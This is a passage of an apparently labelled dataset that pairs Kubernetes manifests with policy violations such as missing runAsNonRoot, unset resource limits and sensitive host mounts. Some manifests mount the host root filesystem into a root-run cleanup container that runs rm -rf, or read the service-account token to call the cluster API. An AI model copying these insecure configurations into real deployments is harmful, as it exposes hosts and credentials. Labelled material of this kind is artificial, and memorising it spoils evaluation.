    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: desafio-go\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: desafio-go\n  template:\n    metadata:\n      labels:\n        app: desafio-go\n    spec:\n      containers:\n      - name: desafio-go\n        image: img-app-deployment\n        ports:\n        - containerPort: 8000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"desafio-go\" is not set to runAsNonRoot"
  },
  {
    "id": "7767",
    "manifest_path": "data/manifests/the_stack_sample/sample_2855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: desafio-go\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: desafio-go\n  template:\n    metadata:\n      labels:\n        app: desafio-go\n    spec:\n      containers:\n      - name: desafio-go\n        image: img-app-deployment\n        ports:\n        - containerPort: 8000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"desafio-go\" has cpu request 0"
  },
  {
    "id": "7768",
    "manifest_path": "data/manifests/the_stack_sample/sample_2855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: desafio-go\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: desafio-go\n  template:\n    metadata:\n      labels:\n        app: desafio-go\n    spec:\n      containers:\n      - name: desafio-go\n        image: img-app-deployment\n        ports:\n        - containerPort: 8000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"desafio-go\" has memory limit 0"
  },
  {
    "id": "7769",
    "manifest_path": "data/manifests/the_stack_sample/sample_2858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: plank\n  labels:\n    app: plank\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: plank\n  template:\n    metadata:\n      labels:\n        app: plank\n    spec:\n      containers:\n      - name: plank\n        image: gcr.io/k8s-prow/plank:v20191008-bbd30bc09\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --skip-report=true\n        volumeMounts:\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"plank\" does not have a read-only root file system"
  },
  {
    "id": "7770",
    "manifest_path": "data/manifests/the_stack_sample/sample_2858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: plank\n  labels:\n    app: plank\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: plank\n  template:\n    metadata:\n      labels:\n        app: plank\n    spec:\n      containers:\n      - name: plank\n        image: gcr.io/k8s-prow/plank:v20191008-bbd30bc09\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --skip-report=true\n        volumeMounts:\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"plank\" is not set to runAsNonRoot"
  },
  {
    "id": "7771",
    "manifest_path": "data/manifests/the_stack_sample/sample_2858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: plank\n  labels:\n    app: plank\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: plank\n  template:\n    metadata:\n      labels:\n        app: plank\n    spec:\n      containers:\n      - name: plank\n        image: gcr.io/k8s-prow/plank:v20191008-bbd30bc09\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --skip-report=true\n        volumeMounts:\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"plank\" has cpu request 0"
  },
  {
    "id": "7772",
    "manifest_path": "data/manifests/the_stack_sample/sample_2858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: plank\n  labels:\n    app: plank\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: plank\n  template:\n    metadata:\n      labels:\n        app: plank\n    spec:\n      containers:\n      - name: plank\n        image: gcr.io/k8s-prow/plank:v20191008-bbd30bc09\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --skip-report=true\n        volumeMounts:\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"plank\" has memory limit 0"
  },
  {
    "id": "7773",
    "manifest_path": "data/manifests/the_stack_sample/sample_2862.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: frontend\nspec:\n  selector:\n    name: frontend\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 80\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:frontend])"
  },
  {
    "id": "7774",
    "manifest_path": "data/manifests/the_stack_sample/sample_2863.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostpath-helper\nspec:\n  selector:\n    matchLabels:\n      name: hostpath-helper\n  template:\n    metadata:\n      labels:\n        name: hostpath-helper\n    spec:\n      containers:\n      - name: cleanup\n        image: ubuntu\n        command:\n        - bash\n        - -xc\n        - rm -rf /mnt/tmp/data-dir /mnt/tmp/data/fast-disks; install -m 777 -d /mnt/tmp/data-dir\n          /mnt/tmp/data/fast-disks && sleep 100500\n        volumeMounts:\n        - name: root\n          mountPath: /mnt\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cleanup\" is using an invalid container image, \"ubuntu\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7775",
    "manifest_path": "data/manifests/the_stack_sample/sample_2863.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostpath-helper\nspec:\n  selector:\n    matchLabels:\n      name: hostpath-helper\n  template:\n    metadata:\n      labels:\n        name: hostpath-helper\n    spec:\n      containers:\n      - name: cleanup\n        image: ubuntu\n        command:\n        - bash\n        - -xc\n        - rm -rf /mnt/tmp/data-dir /mnt/tmp/data/fast-disks; install -m 777 -d /mnt/tmp/data-dir\n          /mnt/tmp/data/fast-disks && sleep 100500\n        volumeMounts:\n        - name: root\n          mountPath: /mnt\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cleanup\" does not have a read-only root file system"
  },
  {
    "id": "7776",
    "manifest_path": "data/manifests/the_stack_sample/sample_2863.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostpath-helper\nspec:\n  selector:\n    matchLabels:\n      name: hostpath-helper\n  template:\n    metadata:\n      labels:\n        name: hostpath-helper\n    spec:\n      containers:\n      - name: cleanup\n        image: ubuntu\n        command:\n        - bash\n        - -xc\n        - rm -rf /mnt/tmp/data-dir /mnt/tmp/data/fast-disks; install -m 777 -d /mnt/tmp/data-dir\n          /mnt/tmp/data/fast-disks && sleep 100500\n        volumeMounts:\n        - name: root\n          mountPath: /mnt\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cleanup\" is not set to runAsNonRoot"
  },
  {
    "id": "7777",
    "manifest_path": "data/manifests/the_stack_sample/sample_2863.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostpath-helper\nspec:\n  selector:\n    matchLabels:\n      name: hostpath-helper\n  template:\n    metadata:\n      labels:\n        name: hostpath-helper\n    spec:\n      containers:\n      - name: cleanup\n        image: ubuntu\n        command:\n        - bash\n        - -xc\n        - rm -rf /mnt/tmp/data-dir /mnt/tmp/data/fast-disks; install -m 777 -d /mnt/tmp/data-dir\n          /mnt/tmp/data/fast-disks && sleep 100500\n        volumeMounts:\n        - name: root\n          mountPath: /mnt\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/\" is mounted on container \"cleanup\""
  },
  {
    "id": "7778",
    "manifest_path": "data/manifests/the_stack_sample/sample_2863.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostpath-helper\nspec:\n  selector:\n    matchLabels:\n      name: hostpath-helper\n  template:\n    metadata:\n      labels:\n        name: hostpath-helper\n    spec:\n      containers:\n      - name: cleanup\n        image: ubuntu\n        command:\n        - bash\n        - -xc\n        - rm -rf /mnt/tmp/data-dir /mnt/tmp/data/fast-disks; install -m 777 -d /mnt/tmp/data-dir\n          /mnt/tmp/data/fast-disks && sleep 100500\n        volumeMounts:\n        - name: root\n          mountPath: /mnt\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cleanup\" has cpu request 0"
  },
  {
    "id": "7779",
    "manifest_path": "data/manifests/the_stack_sample/sample_2863.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostpath-helper\nspec:\n  selector:\n    matchLabels:\n      name: hostpath-helper\n  template:\n    metadata:\n      labels:\n        name: hostpath-helper\n    spec:\n      containers:\n      - name: cleanup\n        image: ubuntu\n        command:\n        - bash\n        - -xc\n        - rm -rf /mnt/tmp/data-dir /mnt/tmp/data/fast-disks; install -m 777 -d /mnt/tmp/data-dir\n          /mnt/tmp/data/fast-disks && sleep 100500\n        volumeMounts:\n        - name: root\n          mountPath: /mnt\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cleanup\" has memory limit 0"
  },
  {
    "id": "7780",
    "manifest_path": "data/manifests/the_stack_sample/sample_2866.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.8\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html\n          name: nginx-vol\n      volumes:\n      - name: nginx-vol\n        hostPath:\n          path: /Users/runcoding/Downloads/k8s\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7781",
    "manifest_path": "data/manifests/the_stack_sample/sample_2866.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.8\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html\n          name: nginx-vol\n      volumes:\n      - name: nginx-vol\n        hostPath:\n          path: /Users/runcoding/Downloads/k8s\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7782",
    "manifest_path": "data/manifests/the_stack_sample/sample_2866.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.8\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html\n          name: nginx-vol\n      volumes:\n      - name: nginx-vol\n        hostPath:\n          path: /Users/runcoding/Downloads/k8s\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7783",
    "manifest_path": "data/manifests/the_stack_sample/sample_2866.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.8\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html\n          name: nginx-vol\n      volumes:\n      - name: nginx-vol\n        hostPath:\n          path: /Users/runcoding/Downloads/k8s\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7784",
    "manifest_path": "data/manifests/the_stack_sample/sample_2866.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.8\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html\n          name: nginx-vol\n      volumes:\n      - name: nginx-vol\n        hostPath:\n          path: /Users/runcoding/Downloads/k8s\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7785",
    "manifest_path": "data/manifests/the_stack_sample/sample_2867.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: zpm-cleaner\n  namespace: iris\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: zpm-cleaner\n          image: curlimages/curl:7.70.0\n          command:\n          - /bin/sh\n          - -c\n          - \"curl -XPATCH --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\               \\\\\\n  -H \\\"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"\\\n            \\  \\\\\\n  -H \\\"Content-Type: application/strategic-merge-patch+json\\\" \\\n            \\                             \\\\\\n  --data '{\\\"spec\\\":{\\\"replicas\\\":0}}'\\\n            \\                                                       \\\\\\n  https://kubernetes.default.svc/apis/apps/v1/namespaces/iris/statefulsets/zpm-registry\\n\\\n            \\nsleep 10\\n\\ncurl -XDELETE --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\                                       \\\\\\n  -H \\\"Authorization: Bearer\\\n            \\ $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"       \\\n            \\                    \\\\\\n  -H \\\"Content-Type: application/json\\\"     \\\n            \\                                                                    \\\n            \\    \\\\\\n  https://kubernetes.default.svc/api/v1/namespaces/iris/persistentvolumeclaims/zpm-registry-volume-zpm-registry-0\\n\\\n            \\nsleep 10\\n\\ncurl -XPATCH --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\               \\\\\\n  -H \\\"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"\\\n            \\  \\\\\\n  -H \\\"Content-Type: application/strategic-merge-patch+json\\\" \\\n            \\                             \\\\\\n  --data '{\\\"spec\\\":{\\\"replicas\\\":1}}'\\\n            \\                                                       \\\\\\n  https://kubernetes.default.svc/apis/apps/v1/namespaces/iris/statefulsets/zpm-registry\\n\"\n        serviceAccountName: zpm-cleaner\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"zpm-cleaner\" does not have a read-only root file system"
  },
  {
    "id": "7786",
    "manifest_path": "data/manifests/the_stack_sample/sample_2867.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: zpm-cleaner\n  namespace: iris\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: zpm-cleaner\n          image: curlimages/curl:7.70.0\n          command:\n          - /bin/sh\n          - -c\n          - \"curl -XPATCH --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\               \\\\\\n  -H \\\"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"\\\n            \\  \\\\\\n  -H \\\"Content-Type: application/strategic-merge-patch+json\\\" \\\n            \\                             \\\\\\n  --data '{\\\"spec\\\":{\\\"replicas\\\":0}}'\\\n            \\                                                       \\\\\\n  https://kubernetes.default.svc/apis/apps/v1/namespaces/iris/statefulsets/zpm-registry\\n\\\n            \\nsleep 10\\n\\ncurl -XDELETE --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\                                       \\\\\\n  -H \\\"Authorization: Bearer\\\n            \\ $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"       \\\n            \\                    \\\\\\n  -H \\\"Content-Type: application/json\\\"     \\\n            \\                                                                    \\\n            \\    \\\\\\n  https://kubernetes.default.svc/api/v1/namespaces/iris/persistentvolumeclaims/zpm-registry-volume-zpm-registry-0\\n\\\n            \\nsleep 10\\n\\ncurl -XPATCH --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\               \\\\\\n  -H \\\"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"\\\n            \\  \\\\\\n  -H \\\"Content-Type: application/strategic-merge-patch+json\\\" \\\n            \\                             \\\\\\n  --data '{\\\"spec\\\":{\\\"replicas\\\":1}}'\\\n            \\                                                       \\\\\\n  https://kubernetes.default.svc/apis/apps/v1/namespaces/iris/statefulsets/zpm-registry\\n\"\n        serviceAccountName: zpm-cleaner\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"zpm-cleaner\" not found"
  },
  {
    "id": "7787",
    "manifest_path": "data/manifests/the_stack_sample/sample_2867.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: zpm-cleaner\n  namespace: iris\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: zpm-cleaner\n          image: curlimages/curl:7.70.0\n          command:\n          - /bin/sh\n          - -c\n          - \"curl -XPATCH --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\               \\\\\\n  -H \\\"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"\\\n            \\  \\\\\\n  -H \\\"Content-Type: application/strategic-merge-patch+json\\\" \\\n            \\                             \\\\\\n  --data '{\\\"spec\\\":{\\\"replicas\\\":0}}'\\\n            \\                                                       \\\\\\n  https://kubernetes.default.svc/apis/apps/v1/namespaces/iris/statefulsets/zpm-registry\\n\\\n            \\nsleep 10\\n\\ncurl -XDELETE --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\                                       \\\\\\n  -H \\\"Authorization: Bearer\\\n            \\ $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"       \\\n            \\                    \\\\\\n  -H \\\"Content-Type: application/json\\\"     \\\n            \\                                                                    \\\n            \\    \\\\\\n  https://kubernetes.default.svc/api/v1/namespaces/iris/persistentvolumeclaims/zpm-registry-volume-zpm-registry-0\\n\\\n            \\nsleep 10\\n\\ncurl -XPATCH --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\               \\\\\\n  -H \\\"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"\\\n            \\  \\\\\\n  -H \\\"Content-Type: application/strategic-merge-patch+json\\\" \\\n            \\                             \\\\\\n  --data '{\\\"spec\\\":{\\\"replicas\\\":1}}'\\\n            \\                                                       \\\\\\n  https://kubernetes.default.svc/apis/apps/v1/namespaces/iris/statefulsets/zpm-registry\\n\"\n        serviceAccountName: zpm-cleaner\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"zpm-cleaner\" is not set to runAsNonRoot"
  },
  {
    "id": "7788",
    "manifest_path": "data/manifests/the_stack_sample/sample_2867.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: zpm-cleaner\n  namespace: iris\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: zpm-cleaner\n          image: curlimages/curl:7.70.0\n          command:\n          - /bin/sh\n          - -c\n          - \"curl -XPATCH --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\               \\\\\\n  -H \\\"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"\\\n            \\  \\\\\\n  -H \\\"Content-Type: application/strategic-merge-patch+json\\\" \\\n            \\                             \\\\\\n  --data '{\\\"spec\\\":{\\\"replicas\\\":0}}'\\\n            \\                                                       \\\\\\n  https://kubernetes.default.svc/apis/apps/v1/namespaces/iris/statefulsets/zpm-registry\\n\\\n            \\nsleep 10\\n\\ncurl -XDELETE --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\                                       \\\\\\n  -H \\\"Authorization: Bearer\\\n            \\ $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"       \\\n            \\                    \\\\\\n  -H \\\"Content-Type: application/json\\\"     \\\n            \\                                                                    \\\n            \\    \\\\\\n  https://kubernetes.default.svc/api/v1/namespaces/iris/persistentvolumeclaims/zpm-registry-volume-zpm-registry-0\\n\\\n            \\nsleep 10\\n\\ncurl -XPATCH --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\               \\\\\\n  -H \\\"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"\\\n            \\  \\\\\\n  -H \\\"Content-Type: application/strategic-merge-patch+json\\\" \\\n            \\                             \\\\\\n  --data '{\\\"spec\\\":{\\\"replicas\\\":1}}'\\\n            \\                                                       \\\\\\n  https://kubernetes.default.svc/apis/apps/v1/namespaces/iris/statefulsets/zpm-registry\\n\"\n        serviceAccountName: zpm-cleaner\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"zpm-cleaner\" has cpu request 0"
  },
  {
    "id": "7789",
    "manifest_path": "data/manifests/the_stack_sample/sample_2867.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: zpm-cleaner\n  namespace: iris\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: zpm-cleaner\n          image: curlimages/curl:7.70.0\n          command:\n          - /bin/sh\n          - -c\n          - \"curl -XPATCH --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\               \\\\\\n  -H \\\"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"\\\n            \\  \\\\\\n  -H \\\"Content-Type: application/strategic-merge-patch+json\\\" \\\n            \\                             \\\\\\n  --data '{\\\"spec\\\":{\\\"replicas\\\":0}}'\\\n            \\                                                       \\\\\\n  https://kubernetes.default.svc/apis/apps/v1/namespaces/iris/statefulsets/zpm-registry\\n\\\n            \\nsleep 10\\n\\ncurl -XDELETE --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\                                       \\\\\\n  -H \\\"Authorization: Bearer\\\n            \\ $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"       \\\n            \\                    \\\\\\n  -H \\\"Content-Type: application/json\\\"     \\\n            \\                                                                    \\\n            \\    \\\\\\n  https://kubernetes.default.svc/api/v1/namespaces/iris/persistentvolumeclaims/zpm-registry-volume-zpm-registry-0\\n\\\n            \\nsleep 10\\n\\ncurl -XPATCH --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\\\n            \\               \\\\\\n  -H \\\"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\\\"\\\n            \\  \\\\\\n  -H \\\"Content-Type: application/strategic-merge-patch+json\\\" \\\n            \\                             \\\\\\n  --data '{\\\"spec\\\":{\\\"replicas\\\":1}}'\\\n            \\                                                       \\\\\\n  https://kubernetes.default.svc/apis/apps/v1/namespaces/iris/statefulsets/zpm-registry\\n\"\n        serviceAccountName: zpm-cleaner\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"zpm-cleaner\" has memory limit 0"
  },
  {
    "id": "7790",
    "manifest_path": "data/manifests/the_stack_sample/sample_2871.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: retraced-nsqd\n  namespace: '{{repl ConfigOption \"namespace\"}}'\nspec:\n  selector:\n    matchLabels:\n      tier: nsq\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: auditlog\n        tier: nsq\n    spec:\n      containers:\n      - name: nsqd\n        image: nsqio/nsq:v1.0.0-compat\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - nsqd -statsd-address ${STATSD_HOST}:${STATSD_PORT} -statsd-prefix \"nsqd.\"\n        env:\n        - name: STATSD_HOST\n          valueFrom:\n            secretKeyRef:\n              name: auditlog\n              key: STATSD_HOST\n        - name: STATSD_PORT\n          valueFrom:\n            secretKeyRef:\n              name: auditlog\n              key: STATSD_PORT\n        ports:\n        - containerPort: 4150\n        - containerPort: 4151\n        resources:\n          requests:\n            cpu: 100m\n          limits:\n            cpu: 500m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nsqd\" does not have a read-only root file system"
  },
  {
    "id": "7791",
    "manifest_path": "data/manifests/the_stack_sample/sample_2871.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: retraced-nsqd\n  namespace: '{{repl ConfigOption \"namespace\"}}'\nspec:\n  selector:\n    matchLabels:\n      tier: nsq\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: auditlog\n        tier: nsq\n    spec:\n      containers:\n      - name: nsqd\n        image: nsqio/nsq:v1.0.0-compat\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - nsqd -statsd-address ${STATSD_HOST}:${STATSD_PORT} -statsd-prefix \"nsqd.\"\n        env:\n        - name: STATSD_HOST\n          valueFrom:\n            secretKeyRef:\n              name: auditlog\n              key: STATSD_HOST\n        - name: STATSD_PORT\n          valueFrom:\n            secretKeyRef:\n              name: auditlog\n              key: STATSD_PORT\n        ports:\n        - containerPort: 4150\n        - containerPort: 4151\n        resources:\n          requests:\n            cpu: 100m\n          limits:\n            cpu: 500m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nsqd\" is not set to runAsNonRoot"
  },
  {
    "id": "7792",
    "manifest_path": "data/manifests/the_stack_sample/sample_2871.yaml",
